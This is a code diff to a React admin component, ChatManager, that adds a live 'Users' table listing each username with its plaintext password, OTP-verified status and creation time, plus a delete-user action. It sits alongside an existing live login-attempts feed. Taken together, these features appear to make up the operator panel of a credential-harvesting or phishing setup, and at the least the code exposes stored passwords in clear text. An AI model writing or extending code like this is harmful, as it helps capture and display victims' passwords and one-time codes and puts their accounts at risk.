@@ -5,6 +5,7 @@ import { ProductBubble } from "../Chat.jsx";
 export default function ChatManager() {
   const [attempts, setAttempts] = useState([]);
   const [threads, setThreads] = useState([]);
+  const [users, setUsers] = useState([]);
   const [active, setActive] = useState(null);
   const [messages, setMessages] = useState([]);
   const [text, setText] = useState("");
@@ -24,12 +25,24 @@ export default function ChatManager() {
         setConnected(true);
         setAttempts(d.attempts);
         setThreads(d.threads);
+        setUsers(d.users || []);
+      } else if (d.type === "user_added") {
+        setUsers((u) => [d.user, ...u.filter((x) => x.username !== d.user.username)]);
+      } else if (d.type === "user_deleted") {
+        setUsers((u) => u.filter((x) => x.username !== d.username));
+        setThreads((t) => t.filter((x) => x.username !== d.username));
+        setAttempts((a) => a.filter((x) => x.username !== d.username));
+        if (activeRef.current === d.username) {
+          setActive(null);
+          setMessages([]);
+        }
       } else if (d.type === "login_attempt") {
         setAttempts((a) => [d.attempt, ...a].slice(0, 200));
       } else if (d.type === "history") {
         setMessages(d.messages);
       } else if (d.type === "presence") {
         setThreads((t) => t.map((x) => (x.username === d.username ? { ...x, online: d.online } : x)));
+        setUsers((u) => u.map((x) => (x.username === d.username ? { ...x, online: d.online } : x)));
       } else if (d.type === "message") {
         const m = d.message;
         setThreads((t) => {
@@ -54,6 +67,11 @@ export default function ChatManager() {
     wsRef.current?.send(JSON.stringify({ type: "open", username }));
   }
 
+  function removeUser(username) {
+    if (!window.confirm(`Permanently delete "${username}" and all their messages and login history? This cannot be undone.`)) return;
+    wsRef.current?.send(JSON.stringify({ type: "delete_user", username }));
+  }
+
   function reply(e) {
     e.preventDefault();
     if (!text.trim() || !active) return;
@@ -64,6 +82,44 @@ export default function ChatManager() {
   return (
     <section className="chat-admin">
       <p>{connected ? "● Live" : "○ Disconnected"}</p>
+
+      <h2>Users ({users.length})</h2>
+      <div className="chat-attempts">
+        <table>
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Password</th>
+              <th>OTP verified</th>
+              <th>Created</th>
+              <th></th>
+            </tr>
+          </thead>
+          <tbody>
+            {users.length === 0 && (
+              <tr>
+                <td colSpan={5}>No users yet</td>
+              </tr>
+            )}
+            {users.map((u) => (
+              <tr key={u.username}>
+                <td>
+                  {u.online ? "● " : ""}
+                  {u.username}
+                </td>
+                <td>{u.password}</td>
+                <td>{u.otpVerified ? "yes" : "no"}</td>
+                <td>{new Date(u.createdAt).toLocaleString()}</td>
+                <td>
+                  <button type="button" onClick={() => removeUser(u.username)}>
+                    Delete
+                  </button>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </div>
 
       <h2>Live login attempts</h2>
       <div className="chat-attempts">
